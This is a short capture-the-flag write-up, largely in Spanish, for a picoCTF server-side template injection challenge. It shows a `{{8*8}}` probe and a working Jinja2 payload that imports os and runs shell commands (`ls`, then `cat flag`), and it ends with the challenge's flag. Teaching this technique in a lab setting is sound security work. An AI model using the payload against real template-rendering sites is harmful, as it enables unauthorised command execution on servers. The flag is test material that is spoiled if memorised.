## Descripción
I made a cool website where you can announce whatever you want! Try it out!
I heard templating is a cool and modular way to build web apps! Check out my website [here](http://rescued-float.picoctf.net:53586/)!
## Pistas
1. Server Side Template Injection
## Solución 1
1. Entrar a la pagina y verificar si se puede hacer SSTI intentando una operacion matematica entre corchetes `{{8*8}}`
2. Usando este código podemos ver los archivos `{{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}`
3. Sustituimos `ls` por `cat flag`
4. Obtenemos la bandera `# picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_73c99823}`

## Referencias
https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/